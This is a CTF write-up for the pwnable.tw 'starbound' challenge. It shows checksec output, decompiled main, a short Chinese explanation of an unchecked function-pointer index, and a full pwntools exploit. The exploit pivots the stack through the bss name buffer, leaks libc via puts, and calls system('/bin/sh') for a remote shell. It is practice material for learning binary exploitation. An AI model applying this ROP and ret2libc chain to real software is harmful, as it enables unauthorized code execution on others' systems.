# starbound

## checksec

```bash
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
FORTIFY:  Enabled
```

## IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char nptr[256]; // [esp+10h] [ebp-104h] BYREF

  init();
  while ( 1 )
  {
    alarm(0x3Cu);
    dword_805817C();
    if ( !readn(nptr, 0x100u) )
      break;
    v3 = strtol(nptr, 0, 10);
    if ( !v3 )
      break;
    ((void (*)(void))dword_8058154[v3])();
  }
  do_bye();
  return 0;
}
```

main函数中没有对下标范围进行检查，所以可以通过下标越界执行bss上的rop，而name是我们可以控制的，其在bss上，所以通过在name处写一个`add esp,0x1c;ret`使其执行在main函数中，`nptr`的rop。

`strtol`不会将非数字转化，所以可以在下标后跟上rop执行。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
binary = './starbound'
context.terminal = ['tmux', 'splitw', '-h']
context(binary = binary, log_level='debug')
# p = process(binary)
p = remote('chall.pwnable.tw',10202)
elf = ELF(binary)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_got = elf.got['read']

main = 0x804A605
add_esp = 0x08048e48

# set name add esp 0x1c ret
p.sendlineafter('> ','6')
p.sendlineafter('> ','2')
p.sendlineafter('Enter your name: ',p32(add_esp))
p.sendlineafter('> ','1')

p.sendlineafter('> ','-33\x00'+'a'*4+p32(puts_plt)+p32(main)+p32(read_got))
read_got  = u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
leak('read_got ', read_got )

libcbase = read_got - 0xd5980
leak('libcbase',libcbase)
system = libcbase + 0x3ada0
binsh = libcbase + 0x15b82b
# gdb.attach(p)
p.sendlineafter('> ','6')
p.sendlineafter('> ','2')
p.sendlineafter('Enter your name: ',p32(add_esp))
p.sendlineafter('> ','1')
payload = p32(system) + p32(0) + p32(binsh)+p32(0)

p.sendlineafter('> ','-33\x00'+'a'*0x4+payload)

p.interactive()
```

